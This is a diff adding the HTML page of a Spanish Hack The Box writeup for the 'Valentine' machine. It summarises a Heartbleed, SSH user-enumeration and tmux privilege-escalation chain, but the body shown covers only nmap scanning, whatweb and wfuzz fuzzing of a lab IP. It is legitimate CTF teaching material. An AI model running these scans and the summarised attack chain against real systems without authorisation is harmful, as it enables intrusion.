@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Valentine - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-valentine/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Valentine - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-valentine/valentine_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-active/">
+          <span class="side-post-card-title">Active</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bounty/">
+          <span class="side-post-card-title">Bounty</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Valentine</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-nibbles/">
+          <span class="side-post-card-title">Nibbles</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bashed/">
+          <span class="side-post-card-title">Bashed</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Valentine - Hack The Box</h1>
+    <div class="post-meta">21 April 2023 · 24 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-valentine/valentine_logo.png" alt="Valentine - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina relativamente sencilla, investigaremos el puerto HTTP que con la ayuda de nmap y haciendo Fuzzing, encontramos una página que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos, pero estara encriptada por lo que no nos servira hasta más adelante. Con la ayuda de nmap encontramos un Exploit llamado Heartbleed con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dara una contraseña para el SSH, usando el Exploit CVE-2018-15473 pondremos nombres randoms y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta Tmux, que encontramos en el historial de Bash y que nos metera a una nueva terminal como Root (CVE-2011-1496).</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>nano</code></li><li><code>cat</code></li><li><code>tr</code></li><li><code>xxd</code></li><li><code>wget</code></li><li><code>ssh2john</code></li><li><code>python2</code></li><li><code>johntheripper</code></li><li><code>git</code></li><li><code>grep</code></li><li><code>metasploit framework(msfconsole)</code></li><li><code>Módulo: auxiliary/scanner/ssl/openssl_heartbleed</code></li><li><code>searchsploit</code></li><li><code>ssh</code></li><li><code>id</code></li><li><code>tmux</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Dirs">Enumerando Directorios Encontrados</a></li>
+        <li><a href="#Llave">Descifrando Llave en Hexadecimal</a></li>
+        <li><a href="#NMAP">Buscando Vulnerabilidades Web con NMAP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando el Exploit Heartbleed</a></li>
+        <li><a href="#Metas">Usando Módulo Auxiliar de Metasploit para Explotar Heartbleed</a></li>
+        <li><a href="#Base64">Descifrando Data en Base64 y Hash</a></li>
+        <li><a href="#Usuario">Buscando un Usuario Valido para Servicio SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumerando Máquina y Escalando Privilegios con Tmux</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Dirs">Enumerando Directorios Encontrados</a></li>
+        <li><a href="#Llave">Descifrando Llave en Hexadecimal</a></li>
+        <li><a href="#NMAP">Buscando Vulnerabilidades Web con NMAP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando el Exploit Heartbleed</a></li>
+        <li><a href="#Metas">Usando Módulo Auxiliar de Metasploit para Explotar Heartbleed</a></li>
+        <li><a href="#Base64">Descifrando Data en Base64 y Hash</a></li>
+        <li><a href="#Usuario">Buscando un Usuario Valido para Servicio SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumerando Máquina y Escalando Privilegios con Tmux</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO opera en dicha máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.79                                                                                                      
+</span></span><span style="display:flex;"><span>PING 10.10.10.79 <span style="color:#f92672">(</span>10.10.10.79<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.79: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">137</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.79: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.79: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.79: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.79 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3012ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 128.773/131.114/137.170/3.505 ms
+</span></span></code></pre></div><p>Por el TTL, sabemos que la máquina usa Linux. Ahora, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.79 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-21 12:09 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:09
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.79 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.10.79
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 10.10.10.79
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.79
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:09, 28.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.79
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>1.9s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-04-21 12:09:04 CST <span style="color:#66d9ef">for</span> 28s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">53231</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">12301</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 28.23 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">126157</span> <span style="color:#f92672">(</span>5.551MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">12366</span> <span style="color:#f92672">(</span>494.692KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay 3 puertos abiertos, dos ya los conocemos, pero al ver el puerto 80 y el puerto 443 me da la impresión que el puerto 80 nos va a redireccionar al puerto 443. Hagamos un escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p22,80,443 10.10.10.79 -oN targeted                       
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-21 12:10 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> 964c51423cba2249204d3eec90ccfd0e <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 46bf1fcc924f1da042b3d216a8583133 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e62b2519cb7e54cb0ab9ac1698c67da9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.2.22 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.2.22 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_ssl-date: 2023-04-21T18:10:30+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.2.22 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>valentine.htb/organizationName<span style="color:#f92672">=</span>valentine.htb/stateOrProvinceName<span style="color:#f92672">=</span>FL/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>| Not valid before: 2018-02-06T00:45:25
+</span></span><span style="display:flex;"><span>|_Not valid after:  2019-02-06T00:45:25
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.49 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Me da mucha curiosidad ese puerto 443, pero primero vamos a investigar la página web del puerto 80.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos.</p>
+<p><img src="/assets/images/htb-writeup-valentine/Captura1.png" alt=""></p>
+<p>Buena imagen, pero no hay nada de nada, veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-valentine/Captura2.png">
+</p>
+<p>Utiliza <strong>PHP</strong>, con eso ya tenemos varios vectores de ataque, veamos si con <strong>whatweb</strong> nos da otro dato:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.10.79
+</span></span><span style="display:flex;"><span>http://10.10.10.79 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.2.22<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.2.22 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.10.79<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>5.3.10-1ubuntu3.26<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/5.3.10-1ubuntu3.26<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Nada que nos sea útil.</p>
+<p>Te diría que buscaramos en el código fuente, pero no encontraras nada aparte de la imagen, tanto en el <strong>puerto 80/HTTP</strong> como en el <strong>puerto 443/HTTPS</strong>, mejor apliquemos <strong>Fuzzing</strong> de una vez.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ/    
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.79/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000035:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">30</span> W       <span style="color:#ae81ff">287</span> Ch      <span style="color:#e6db74">&#34;cgi-bin&#34;</span>                                                            
+</span></span><span style="display:flex;"><span>000000015:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">38</span> Ch       <span style="color:#e6db74">&#34;index&#34;</span>                                                              
+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">38</span> Ch       <span style="color:#e6db74">&#34;http://10.10.10.79//&#34;</span>                                               
+</span></span><span style="display:flex;"><span>000000834:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">15</span> L     <span style="color:#ae81ff">66</span> W       <span style="color:#ae81ff">1097</span> Ch     <span style="color:#e6db74">&#34;dev&#34;</span>                                                                
+</span></span><span style="display:flex;"><span>000000083:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">30</span> W       <span style="color:#ae81ff">285</span> Ch      <span style="color:#e6db74">&#34;icons&#34;</span>                                                              
+</span></span><span style="display:flex;"><span>000000222:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">30</span> W       <span style="color:#ae81ff">283</span> Ch      <span style="color:#e6db74">&#34;doc&#34;</span>                                                                
+</span></span><span style="display:flex;"><span>000023112:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">27</span> L     <span style="color:#ae81ff">54</span> W       <span style="color:#ae81ff">554</span> Ch      <span style="color:#e6db74">&#34;encode&#34;</span>                                                             
+</span></span><span style="display:flex;"><span>000024243:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">25</span> L     <span style="color:#ae81ff">54</span> W       <span style="color:#ae81ff">552</span> Ch      <span style="color:#e6db74">&#34;decode&#34;</span>                                                             
+</span></span><span style="display:flex;"><span>000045240:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">38</span> Ch       <span style="color:#e6db74">&#34;http://10.10.10.79//&#34;</span>                                               
+</span></span><span style="display:flex;"><span>000095524:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">30</span> W       <span style="color:#ae81ff">293</span> Ch      <span style="color:#e6db74">&#34;server-status&#34;</span>                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 575.5224
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220537</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 383.2344
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>Gobuster</strong>, aunque vamos a enfocarlo en archivos <strong>PHP</strong> y <strong>TXT</strong> para ver si encuentra algo útil:</p>
